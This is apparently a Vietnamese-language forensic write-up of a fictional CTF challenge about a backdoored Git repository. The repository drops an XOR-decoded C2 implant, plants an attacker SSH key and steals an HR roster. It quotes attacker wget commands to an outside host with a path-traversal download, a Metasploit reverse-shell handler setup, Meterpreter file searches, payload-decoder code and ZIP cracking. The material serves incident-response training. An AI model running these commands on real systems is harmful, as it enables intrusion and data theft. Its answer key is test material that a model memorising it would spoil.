# Holmes CTF 2026 – Sherlock 05: Backdoored Repository and Exposed Server (PoisonedBranch)
## DFIR Investigation & Incident Response Writeup

---

### 1. Executive Summary (Tổng quan vụ việc)

* **Thử thách:** Sherlock 05 – Backdoored Repository and Exposed Server (Codename: `PoisonedBranch`).
* **Nạn nhân:** Tom Ainsworth (`Tom`), lập trình viên phụ trách hệ thống ứng dụng nhân sự khẩn cấp (Emergency HR Application) của chính phủ tại Whitehall.
* **Máy trạm:** `LT-TAinsworth` (Linux x86_64, Debian/Ubuntu).
* **Tác nhân đe dọa (Threat Actor):** Sebastian Moran (`cbass.Moran@blackpearl2026.htb`), liên quan mật thiết tới tổ chức gián điệp **NAPOLEON / VON BORK**.
* **Kịch bản tấn công (Attack Flow):**
  1. **Supply Chain / Malicious Repository:** Nạn nhân tải về kho mã nguồn mở nội bộ giả mạo `diogenes-ticket-parser` từ máy chủ `devforge.internal:3000`.
  2. **Multi-stage Payload Execution:** Khi chạy `ticket_parser.py`, module `telemetry.py` âm thầm thực hiện giải mã thuật toán XOR lặp giữa ảnh `diogenes.jpg` và tệp nhị phân mã hóa `calibration.bin`, trích xuất mã độc ELF C2 implant đặt tại `/home/Tom/.cache/.ticket-parser/.integrity` và kích hoạt ngầm dưới nền (`PID 1514`).
  3. **C2 Callback:** Implant thiết lập kết nối điều khiển ngược (Reverse Shell / C2 Beaconing) về máy chủ kẻ tấn công tại `203.0.113.10:31337`.
  4. **Persistence & Lateral Movement:** Kẻ tấn công truy cập shell, cố gắng tải khóa SSH public của mình về máy qua URL `BlackPearl2026.htb:9999` (thất bại do chưa phân giải DNS) rồi đổi sang IP `203.0.113.10:9999` với Cookie `X-Operator-Auth=napoleon_moran_1894` để ghi đè vào `~/.ssh/authorized_keys`.
  5. **Data Exfiltration & Anti-Forensics:** Kẻ tấn công thu thập tài liệu nhân sự mật `Gov_HR_Continuity_Emergency_Callout_Roster.pdf` trong thư mục `Work_Stuff/ONBOARDING`, tải về máy chủ gián điệp, sau đó dùng lệnh `rm` xóa bỏ file gốc trên máy trạm để phi tang dấu vết.

---

### 2. Incident Timeline (Dòng thời gian sự kiện)

Dữ liệu được phục hồi và tương quan chuẩn xác từ Linux Audit Log (`audit.log`) và báo cáo hiện trạng mạng UAC (`uac_extracted`):

| Thời gian (UTC) | Thành phần / Tiến trình | Sự kiện & Lệnh thực thi chi tiết |
| :--- | :--- | :--- |
| **2026-09-15 14:19:59** | `git` (PID 1492) | Tom clone repo độc hại: `git clone http://devforge.internal:3000/diogenes/diogenes-ticket-parser.git`. |
| **2026-09-15 14:20:20** | `python3` (PID 770) | Nạn nhân chạy ứng dụng: `python3 ticket_parser.py`. |
| **2026-09-15 14:20:21** | `telemetry.py` / `sh` | Kích hoạt script: giải mã `calibration.bin` thành `~/.cache/.ticket-parser/.integrity`. Cấp quyền `chmod +x` và chạy ngầm. |
| **2026-09-15 14:20:21** | `.integrity` (PID 1514) | Mã độc khởi chạy và duy trì kết nối C2 tới `203.0.113.10:31337`. |
| **2026-09-15 14:26:40** | `wget` (PPID 1514) | Kẻ tấn công thử tải SSH key qua domain: `wget ... http://BlackPearl2026.htb:9999/download?file=../../.ssh/id_rsa.pub`. |
| **2026-09-15 14:34:50** | `wget` (PPID 1514) | Kẻ tấn công đổi sang IP trực tiếp: `wget -q --header=Cookie: X-Operator-Auth=napoleon_moran_1894 -O authorized_keys http://203.0.113.10:9999/download?file=../../.ssh/id_rsa.pub`. |
| **2026-09-15 14:40:57** | `rm` (PPID 1549, PID 1551) | Kẻ tấn công xóa tài liệu mật: `rm Gov_HR_Continuity_Emergency_Callout_Roster.pdf` tại `/home/Tom/Work_Stuff/ONBOARDING`. |
| **2026-09-15 15:53:50** | UAC Triage | Thanh tra Lestrade tiến hành cô lập máy trạm và thu thập chứng cứ số bằng UAC 3.3.0. |

---

### 3. Chi tiết lời giải & Bằng chứng kỹ thuật (Câu 1 – 15)

#### Câu 1: Tên của kho mã nguồn độc hại
* **Câu hỏi:** *What was the name of the malicious repository? (string)*
* **Chứng cứ:**
  * File cấu hình Git `Tom_extracted/home/Tom/Projects/diogenes-ticket-parser/.git/config`:
    ```ini
    [remote "origin"]
        url = http://devforge.internal:3000/diogenes/diogenes-ticket-parser.git
    ```
  * Lệnh trong `audit.log`: `git clone http://devforge.internal:3000/diogenes/diogenes-ticket-parser.git`.
* **Đáp án:** `diogenes-ticket-parser`

---

#### Câu 2: Địa chỉ Email của tác giả repo độc hại
* **Câu hỏi:** *What email address is listed for the author of the repo? (email address)*
* **Chứng cứ:**
  * Lịch sử commit Git:
    ```text
    commit 81d8e7448c185be0733d8cab67b40a2e572fd91e
    Author: Sebastain Moran <cbass.Moran@blackpearl2026.htb>
    Date:   Fri Sep 11 16:05:06 2026 +0100
    ```
* **Đáp án:** `cbass.Moran@blackpearl2026.htb`

---

#### Câu 3: Tệp lưu giữ payload đã bị mã hóa
* **Câu hỏi:** *What file holds the encrypted payload? (filename.ext)*
* **Chứng cứ:**
  * File `src/ticket_parser/telemetry.py` có đoạn mã giải mã payload:
    ```python
    image_path = source_dir / "diogenes.jpg"
    calibration_path = source_dir / "calibration.bin"
    image_data = image_path.read_bytes()
    calibration_data = calibration_path.read_bytes()
    reconstructed = repeating(image_data, calibration_data)
    ```
  * Tệp `calibration.bin` có dung lượng 1,138,480 bytes, chứa toàn bộ payload nhị phân ELF đã XOR mã hóa với key lặp từ `diogenes.jpg`.
* **Đáp án:** `calibration.bin`

---

#### Câu 4: Đường dẫn đầy đủ của C2 Implant trên máy trạm
* **Câu hỏi:** *What is the full path of the c2 implant? (/path/to/file)*
* **Chứng cứ:**
  * Phân tích `telemetry.py`:
    * `_CACHE_DIR` (`LmNhY2hl`) $\rightarrow$ `.cache`
    * `_PARSER_DIR` (`LnRpY2tldC1wYXJzZXI=`) $\rightarrow$ `.ticket-parser`
    * `_FILE` (`LmludGVncml0eQ==`) $\rightarrow$ `.integrity`
    * File được ghi tại: `Path.home() / .cache / .ticket-parser / .integrity`
  * Đối chiếu danh sách tiến trình `live_response/process/ps_auxwww.txt`:
    `Tom 1514 ... /home/Tom/.cache/.ticket-parser/.integrity`
* **Đáp án:** `/home/Tom/.cache/.ticket-parser/.integrity`

---

#### Câu 5: Cổng mạng implant kết nối ngược về C2
* **Câu hỏi:** *What port did the implant connect back to? (number)*
* **Chứng cứ:**
  * File `live_response/network/ss_-tanp.txt` ghi nhận kết nối TCP ESTABLISHED:
    ```text
    ESTAB  0  0  192.168.0.21:50878  203.0.113.10:31337  users:((".integrity",pid=1514,fd=4))
    ```
* **Đáp án:** `31337`

---

#### Câu 6: PID của tiến trình implant
* **Câu hỏi:** *What is the pid of the implant? (number)*
* **Chứng cứ:**
  * Ghi nhận đồng nhất trong cả `ps_auxwww.txt` và `ss_-tanp.txt`:
    `PID: 1514`
* **Đáp án:** `1514`

---

#### Câu 7: Cặp URL:PORT kẻ tấn công dùng trước khi đổi sang IP:PORT
* **Câu hỏi:** *The attacker tried to use URL:PORT before using IP:PORT to download a file to Tom's machine. What was the URL:PORT combo? (set the spawned vm IP to this URL in your /etc/hosts to complete the challenge)*
* **Chứng cứ:**
  * Phân tích `audit.log` tại mốc thời gian `14:26:40`:
    `wget -q --header="Cookie: X-Operator-Auth=..." -O authorized_keys http://BlackPearl2026.htb:9999/download?file=...`
    Sau đó tại `14:34:50`, kẻ tấn công đổi sang IP `http://203.0.113.10:9999`.
* **Đáp án:** `BlackPearl2026.htb:9999`

---

#### Câu 8: Tên Cookie/Token xác thực trên máy chủ web của kẻ tấn công
* **Câu hỏi:** *What is the name of the Cookie/Token for the attackers web server? (Header=value)*
* **Chứng cứ:**
  * Tham số header trong lệnh `wget` được trích xuất từ `audit.log`:
    `--header="Cookie: X-Operator-Auth=napoleon_moran_1894"`
* **Đáp án:** `X-Operator-Auth=napoleon_moran_1894`

---

#### Câu 9: Lệnh xóa file của kẻ tấn công trước khi rời đi
* **Câu hỏi:** *The attacker deleted a file before leaving. What command did they run? (string)*
* **Chứng cứ:**
  * Bản ghi `audit.log` (msg `audit(1789483257.580:381)`):
    * `comm="rm"`
    * `cwd="/home/Tom/Work_Stuff/ONBOARDING"`
    * `EXECVE: a0="rm" a1="Gov_HR_Continuity_Emergency_Callout_Roster.pdf"`
* **Đáp án:** `rm Gov_HR_Continuity_Emergency_Callout_Roster.pdf`

---

#### Câu 10: PPID của lệnh xóa file ở câu trước
* **Câu hỏi:** *What was the ppid of the command from the previous question? (number)*
* **Chứng cứ:**
  * Bản ghi `SYSCALL` của lệnh `rm` trong `audit.log`:
    `type=SYSCALL msg=audit(1789483257.580:381): ... ppid=1549 pid=1551 ... comm="rm"`
* **Đáp án:** `1549`

---

#### Câu 11: Lệnh cấu hình listener chỉ định kiến trúc của implant
* **Câu hỏi:** *While preparing the listener the attacker declared the architecture of the implant. What command did they use? (string)*
* **Chứng cứ:**
  * Khai thác LFI trên máy chủ kẻ tấn công đọc `/home/moran/.msf4/history`:
    ```text
    use exploit/multi/handler
    set payload linux/x64/meterpreter_reverse_tcp
    set lhost 203.0.113.10
    set lport 31337
    exploit -j
    ```
  * Lệnh chỉ định rõ kiến trúc `linux/x64` là `set payload linux/x64/meterpreter_reverse_tcp`.
* **Đáp án:** `set payload linux/x64/meterpreter_reverse_tcp`

---

#### Câu 12: Lệnh dò tìm thư mục & file cụ thể trên máy của Tom
* **Câu hỏi:** *The attacker attempted to locate a specific directory and file combination on Tom's machine. What command was used? (string)*
* **Chứng cứ:**
  * Khai thác LFI đọc lịch sử Meterpreter tại `/home/moran/.msf4/meterpreter_history`:
    ```text
    search -d ONBOARDING -f *.pdf
    cat cvoss_exfil
    exit
    ```
  * Lệnh tìm kiếm theo thư mục `ONBOARDING` và định dạng `*.pdf` trong Meterpreter console.
* **Đáp án:** `search -d ONBOARDING -f *.pdf`

---

#### Câu 13: Tên tệp kẻ tấn công dùng để lưu trữ các tài liệu exfiltrate
* **Câu hỏi:** *What is the name of the file the attacker is keeping the exfiltrated documents in? (filename.ext)*
* **Chứng cứ:**
  * Khai thác LFI và SSH vào máy chủ kẻ tấn công:
    * Thư mục `/home/moran/Exfiltrated_Loot/` chứa tệp nén mật khẩu: `LOOT.zip`.
    * Lịch sử bash `/home/moran/.bash_history` ghi lại quá trình tạo zip:
      `zip -P ... LOOT.zip Gov_HR_Continuity_Emergency_Callout_Roster.pdf cvoss_exfil README.txt`
* **Đáp án:** `LOOT.zip`

---

#### Câu 14: Tên của người bị bôi đen / che chức vụ trong tài liệu
* **Câu hỏi:** *What is the name of the person that has their position redacted? (FirstName LastName)*
* **Chứng cứ:**
  * Giải mã `LOOT.zip` bằng phương pháp **Known-Plaintext Attack (Biham-Kocher)** sử dụng công cụ `bkcrack` với tệp `README.txt` (nội dung: `Upon exfiltration of loot. Package into a password protected zip. Remove remnants.\n`).
  * Trích xuất tệp PDF `Gov_HR_Continuity_Emergency_Callout_Roster.pdf`:
    ```text
    Employee ID: DIO-1648
    Employee: Sarah Kemp
    User ID: skemp
    Directorate: Identity Operations
    Position: REDACTED
    Call-Out: Tier 1
    Mobile: +44 7700 900 317
    Home Address: Flat 6, Ashdown House, Palace Court, London W2 4LS
    Handling: CONFIDENTIAL
    ```
  * Người duy nhất có trường Position bị ẩn là `Sarah Kemp`.
* **Đáp án:** `Sarah Kemp`

---

#### Câu 15: Địa chỉ nhà của người được xác định ở câu trước
* **Câu hỏi:** *What is the address of the previously identified person? (string)*
* **Chứng cứ:**
  * Trích xuất từ bảng Emergency Call-Out Roster trong tài liệu PDF mật:
    `Flat 6, Ashdown House, Palace Court, London W2 4LS`
* **Đáp án:** `Flat 6, Ashdown House, Palace Court, London W2 4LS`

---

### 4. Bảng tổng hợp đáp án nộp CTF (Summary Table)

| # | Câu hỏi | Định dạng yêu cầu | Đáp án chính xác |
|---|---|---|---|
| **1** | What was the name of the malicious repository? | `string` | `diogenes-ticket-parser` |
| **2** | What email address is listed for the author of the repo? | `email address` | `cbass.Moran@blackpearl2026.htb` |
| **3** | What file holds the encrypted payload? | `filename.ext` | `calibration.bin` |
| **4** | What is the full path of the c2 implant? | `/path/to/file` | `/home/Tom/.cache/.ticket-parser/.integrity` |
| **5** | What port did the implant connect back to? | `number` | `31337` |
| **6** | What is the pid of the implant? | `number` | `1514` |
| **7** | The attacker tried to use URL:PORT before using IP:PORT... | `URL:PORT` | `BlackPearl2026.htb:9999` |
| **8** | What is the name of the Cookie/Token for the attackers web server? | `Header=value` | `X-Operator-Auth=napoleon_moran_1894` |
| **9** | The attacker deleted a file before leaving. What command did they run? | `string` | `rm Gov_HR_Continuity_Emergency_Callout_Roster.pdf` |
| **10** | What was the ppid of the command from the previous question? | `number` | `1549` |
| **11** | While preparing the listener the attacker declared the architecture... | `string` | `set payload linux/x64/meterpreter_reverse_tcp` |
| **12** | The attacker attempted to locate a specific directory and file combination... | `string` | `search -d ONBOARDING -f *.pdf` |
| **13** | What is the name of the file the attacker is keeping the exfiltrated documents in? | `filename.ext` | `LOOT.zip` |
| **14** | What is the name of the person that has their position redacted? | `FirstName LastName` | `Sarah Kemp` |
| **15** | What is the address of the previously identified person? | `string` | `Flat 6, Ashdown House, Palace Court, London W2 4LS` |
